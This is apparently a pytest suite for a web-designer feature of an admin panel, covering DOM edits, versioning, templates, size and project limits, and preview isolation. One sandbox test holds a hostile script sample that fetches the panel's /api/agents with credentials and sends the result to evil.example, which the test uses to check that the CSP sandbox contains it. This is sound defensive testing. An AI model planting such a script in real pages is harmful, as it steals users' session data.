"""Тесты веб-дизайнера: генерация, точечные правки, версии, превью с пикером.

Сеть не трогается: AI-правка проверяется только в честном отказе «нет модели»
(реестр в тестах пуст) — сами операции правки детерминированы и покрыты ниже.
"""
from __future__ import annotations

import re

import pytest
from fastapi import HTTPException

import pytest

from bcc.web_designer_dom import (
    apply_edit, assign_bd_ids, find_by_path, inject_preview,
    parse_document, serialize,
)

SIMPLE = """<!DOCTYPE html>
<html><head><title>t</title></head>
<body>
<h1>Заголовок</h1>
<div class="cards"><p class="a">первый</p><p>второй</p></div>
</body></html>
"""

# Нумерация bd-id детерминирована (обход в глубину):
# bd-1 html, bd-2 head, bd-3 title, bd-4 body, bd-5 h1, bd-6 div, bd-7 p.a, bd-8 p


# ---------------------------------------------------------------- DOM-модуль

def test_dom_roundtrip_preserves_entities_comments_and_script():
    # <br/> нормализуется в <br> — семантика та же, остальное дословно
    messy = ("<html><body><!-- привет --><p>A &amp; B &lt;ok&gt;</p>"
             "<script>if (1<2){alert('x&y')}</script><br></body></html>")
    assert serialize(parse_document(messy)) == messy


def test_dom_bd_ids_deterministic_and_found_in_edit():
    _, desc = apply_edit(SIMPLE, {"op": "style", "bd_id": "bd-7", "props": {"color": "red"}})
    assert desc["tag"] == "p" and desc["classes"] == ["a"]


def test_dom_edit_by_short_path_and_text():
    new_html, desc = apply_edit(SIMPLE, {"op": "text", "path": "p", "text": "замена"})
    assert "замена" in new_html and desc["tag"] == "p"


def test_dom_path_nth_of_type():
    root = parse_document(SIMPLE)
    assign_bd_ids(root)
    assert find_by_path(root, "html > body > div:nth-of-type(1) > p:nth-of-type(2)") is not None
    assert find_by_path(root, "html > body > div:nth-of-type(1) > p:nth-of-type(5)") is None


def test_dom_replace_and_delete():
    replaced, _ = apply_edit(SIMPLE, {"op": "replace", "bd_id": "bd-5", "html": "<h2 id=n>Новый</h2>"})
    assert 'id="n"' in replaced
    deleted, desc = apply_edit(replaced, {"op": "delete", "bd_id": "bd-5"})
    assert "Новый" not in deleted and desc["tag"] == "h2"


def test_dom_errors_are_explicit():
    with pytest.raises(LookupError):
        apply_edit(SIMPLE, {"op": "text", "bd_id": "bd-999", "text": "x"})
    with pytest.raises(ValueError):
        apply_edit(SIMPLE, {"op": "unknown", "bd_id": "bd-3"})
    with pytest.raises(ValueError):
        apply_edit(SIMPLE, {"op": "style", "bd_id": "bd-3", "props": {}})


def test_inject_preview_numbers_elements_and_stores_clean():
    injected = inject_preview(SIMPLE)
    assert "data-bd-id" in injected and "bd-label" in injected
    # хранимый код без служебных номеров
    assert "data-bd-id" not in SIMPLE
    edited, _ = apply_edit(SIMPLE, {"op": "style", "bd_id": "bd-3", "props": {"color": "red"}})
    assert "data-bd-id" not in edited


# ---------------------------------------------------------------- API

async def _create(env, **kw):
    body = {"name": "Кофейня Север", "prompt": "кафе с доставкой", "template": "auto", **kw}
    res = await env.client.post("/api/web-designer/projects", json=body)
    assert res.status_code == 200, res.text
    return res.json()


async def test_create_generates_site_and_preview_picks(env):
    data = await _create(env)
    meta, code = data["meta"], data["code"]
    assert meta["version"] == 1
    assert meta["template"] == "cafe"          # «кафе с доставкой» → шаблон кафе
    assert code.lstrip().lower().startswith("<!doctype html")
    assert "Забронировать столик" in code

    preview = await env.client.get(f"/api/web-designer/projects/{meta['id']}/preview")
    assert preview.status_code == 200
    assert "data-bd-id" in preview.text and "bd-preview" in preview.text
    # а в сохранённом коде маркеров нет
    project = await env.client.get(f"/api/web-designer/projects/{meta['id']}")
    assert "data-bd-id" not in project.json()["code"]


async def test_blank_project_and_code_save(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    res = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                               json={"html": SIMPLE, "note": "первая вёрстка"})
    assert res.status_code == 200 and res.json()["meta"]["version"] == 2
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "Заголовок" in project.json()["code"]
    # не-HTML сервер честно не берёт
    bad = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                               json={"html": "просто текст без тегов"})
    assert bad.status_code == 422


async def test_point_edits_via_api(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    await env.client.put(f"/api/web-designer/projects/{pid}/code", json={"html": SIMPLE})

    style = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "style", "bd_id": "bd-7", "props": {"color": "#ff0000", "font-size": "30px"}})
    assert style.status_code == 200
    assert style.json()["element"]["tag"] == "p"
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "color: #ff0000" in project.json()["code"]

    text = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "text", "path": "html > body > h1", "text": "Новый заголовок"})
    assert text.status_code == 200
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "Новый заголовок" in project.json()["code"]

    missing = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "delete", "bd_id": "bd-999"})
    assert missing.status_code == 404
    bad_op = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "magic", "bd_id": "bd-3"})
    assert bad_op.status_code == 422


async def test_versions_and_restore(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    await env.client.put(f"/api/web-designer/projects/{pid}/code",
                         json={"html": SIMPLE, "note": "первая вёрстка"})
    await env.client.put(f"/api/web-designer/projects/{pid}/code",
                         json={"html": SIMPLE.replace("Заголовок", "Вторая версия")})
    versions = (await env.client.get(f"/api/web-designer/projects/{pid}/versions")).json()["items"]
    assert [v["version"] for v in versions] == [1, 2, 3]
    assert versions[0]["note"] == "пустой проект"
    assert versions[1]["note"] == "первая вёрстка"

    restore = await env.client.post(f"/api/web-designer/projects/{pid}/versions/1/restore")
    assert restore.status_code == 200
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "Вторая версия" not in project.json()["code"]
    assert project.json()["meta"]["version"] == 4

    missing = await env.client.post(f"/api/web-designer/projects/{pid}/versions/99/restore")
    assert missing.status_code == 404


async def test_generate_endpoint_steps_and_detection(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    res = await env.client.post(f"/api/web-designer/projects/{pid}/generate",
                                json={"prompt": "магазин одежды в тёмной теме", "template": "auto"})
    body = res.json()
    assert res.status_code == 200
    assert body["template"] == "shop" and body["palette"] == "dark"
    assert len(body["steps"]) >= 5
    for step in body["steps"]:
        assert step.strip().endswith("</html>")
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert project.json()["meta"]["version"] == 2
    assert "Хиты продаж" in project.json()["code"]


async def test_templates_catalog(env):
    res = await env.client.get("/api/web-designer/templates")
    assert res.status_code == 200
    ids = [t["id"] for t in res.json()["items"]]
    assert {"landing", "portfolio", "cafe", "shop", "blog", "agency"} <= set(ids)


async def test_ai_edit_honest_without_model(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    res = await env.client.post(f"/api/web-designer/projects/{pid}/ai-edit",
                                json={"prompt": "сделай заголовок крупнее"})
    assert res.status_code == 409
    # форма ошибки API: {error: {message}}
    assert "модел" in res.json()["error"]["message"].lower()


async def test_list_and_delete_project(env):
    data = await _create(env)
    pid = data["meta"]["id"]
    listing = (await env.client.get("/api/web-designer/projects")).json()["items"]
    assert any(p["id"] == pid for p in listing)
    deleted = await env.client.delete(f"/api/web-designer/projects/{pid}")
    assert deleted.status_code == 200
    gone = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert gone.status_code == 404


# ------------------------------------------------- изоляция превью (P0)

async def test_preview_of_hostile_code_cannot_reach_the_panel(env):
    """Превью — чужой код на origin панели. Без песочницы скрипт внутри него
    прочитал бы CSRF-токен из localStorage и пошёл бы с cookie сессии в /api,
    вплоть до terminal.run. Ограничение обязано приходить С СЕРВЕРА: атрибут
    iframe можно забыть, заголовок — нет."""
    data = await _create(env)
    pid = data["meta"]["id"]
    hostile = ("<!doctype html><html><body><h1>визитка</h1>"
               "<script>fetch('/api/agents',{credentials:'include'})"
               ".then(r=>r.text()).then(t=>fetch('https://evil.example/'+encodeURIComponent(t)));"
               "</script></body></html>")
    res = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                               json={"html": hostile, "note": "вставлен чужой код"})
    assert res.status_code == 200, res.text

    preview = await env.client.get(f"/api/web-designer/projects/{pid}/preview")
    assert preview.status_code == 200
    csp = preview.headers.get("content-security-policy", "")
    # непрозрачный origin: ни cookie, ни localStorage, ни /api из кадра
    assert "sandbox allow-scripts" in csp
    assert "allow-same-origin" not in csp
    assert preview.headers.get("x-content-type-options") == "nosniff"
    # код сохранён как есть — панель ничего не «чистит» втихую и не притворяется,
    # что обезвредила скрипт: он просто исполняется в песочнице
    assert "evil.example" in preview.text


def test_preview_iframe_is_sandboxed_in_the_ui():
    """Вторая половина того же инварианта: кадр в UI объявлен песочницей и
    сообщения принимаются только от него самого."""
    from pathlib import Path
    page = (Path(__file__).resolve().parents[1] / "ui" / "pages" / "web_designer.js").read_text(encoding="utf-8")
    # значение атрибута, а не текст файла: слова «allow-same-origin» законно
    # встречаются в комментарии, который объясняет, почему его там нет
    values = re.findall(r"sandbox:\s*'([^']*)'", page)
    assert values == ["allow-scripts"], values
    assert "ev.source !== frame.contentWindow" in page


# ------------------------------------------------- границы хранения

async def test_listed_version_can_always_be_restored(env):
    """Снимки чистились лексикографически: «v10» сортируется раньше «v9», поэтому
    срез удалял файлы версий, которые остаются в списке, и откат к ним отвечал
    404. Список версий и каталог снимков обязаны говорить одно и то же."""
    from bcc.features import web_designer as wd
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    for i in range(wd.MAX_VERSIONS + 12):
        res = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                                   json={"html": f"<html><body><p>{i}</p></body></html>",
                                         "note": f"правка {i}"})
        assert res.status_code == 200, res.text
    listed = (await env.client.get(f"/api/web-designer/projects/{pid}/versions")).json()["items"]
    assert len(listed) == wd.MAX_VERSIONS
    for item in listed:
        res = await env.client.post(
            f"/api/web-designer/projects/{pid}/versions/{item['version']}/restore")
        assert res.status_code == 200, f"версия {item['version']} в списке, но не восстановима"


async def test_oversized_document_is_refused_on_every_write_path(env):
    """Предел размера стоял в схемах запросов, но откат и ответ модели идут мимо
    них. Проверяется единственная точка записи."""
    from bcc.features import web_designer as wd
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    pdir = wd._pdir(env.svc, int(pid))
    huge = "<html><body>" + "я" * (wd.MAX_HTML_CHARS + 1) + "</body></html>"
    with pytest.raises(HTTPException) as exc:
        wd._save_code(env.svc, pdir, huge, "слишком большой")
    assert exc.value.status_code == 413


async def test_project_limit_refuses_instead_of_hiding(env):
    """Предел применялся только к списку: проекты копились на диске, а лишние
    просто не показывались."""
    from bcc.features import web_designer as wd
    root = wd._root(env.svc)
    root.mkdir(parents=True, exist_ok=True)
    for i in range(1, wd.MAX_PROJECTS + 1):
        (root / str(i)).mkdir(exist_ok=True)
    res = await env.client.post("/api/web-designer/projects",
                                json={"name": "лишний", "prompt": "кафе", "template": "blank"})
    assert res.status_code == 409 and "предел" in res.json()["error"]["message"]
